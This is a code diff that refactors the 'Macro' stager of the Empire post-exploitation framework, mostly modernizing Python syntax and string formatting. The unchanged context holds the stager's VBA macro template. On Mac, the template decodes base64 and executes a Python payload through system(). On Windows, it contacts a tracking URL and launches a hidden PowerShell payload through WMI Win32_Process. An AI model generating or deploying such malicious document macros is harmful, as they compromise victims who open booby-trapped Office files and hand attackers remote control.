@@ -1,16 +1,13 @@
-from __future__ import print_function
-
 import logging
 import re
-from builtins import object, range, str
 
 from empire.server.common import helpers
 
 log = logging.getLogger(__name__)
 
 
-class Stager(object):
-    def __init__(self, mainMenu, params=[]):
+class Stager:
+    def __init__(self, mainMenu):
         self.info = {
             "Name": "Macro",
             "Authors": [
@@ -92,7 +89,7 @@ class Stager(object):
                 "Value": "default",
             },
             "ProxyCreds": {
-                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
+                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                 "Required": False,
                 "Value": "default",
             },
@@ -118,12 +115,6 @@ class Stager(object):
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]["Value"] = value
 
     def generate(self):
         def formStr(varstr, instr):
@@ -229,7 +220,7 @@ End Sub
 Public Function Debugging() As Variant
     On Error Resume Next
             Dim tracking As String
-            tracking = "%s"
+            tracking = "{}"
             #If Mac Then
                 'Mac Rendering
                 If Val(Application.Version) < 15 Then 'Mac Office 2011
@@ -239,7 +230,7 @@ Public Function Debugging() As Variant
                 End If
                 Dim result As Long
                 Dim str As String
-                %s
+                {}
                 'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
                 result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
             #Else
@@ -248,16 +239,16 @@ Public Function Debugging() As Variant
                 Set objWeb = CreateObject("Microsoft.XMLHTTP")
                 objWeb.Open "GET", tracking & "Windows", False
                 objWeb.send
-                %s
+                {}
                 'MsgBox(str)
-                Set objWMIService = GetObject("winmgmts:\\\\.\\root\cimv2")
+                Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
                 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                 Set objConfig = objStartup.SpawnInstance_
                 objConfig.ShowWindow = 0
-                Set objProcess = GetObject("winmgmts:\\\\.\\root\cimv2:Win32_Process")
+                Set objProcess = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process")
                 objProcess.Create str, Null, objConfig, intProcessID
             #End If
-End Function""" % (
+End Function""".format(
             pixel_track_url,
             pypayload,
             poshpayload,
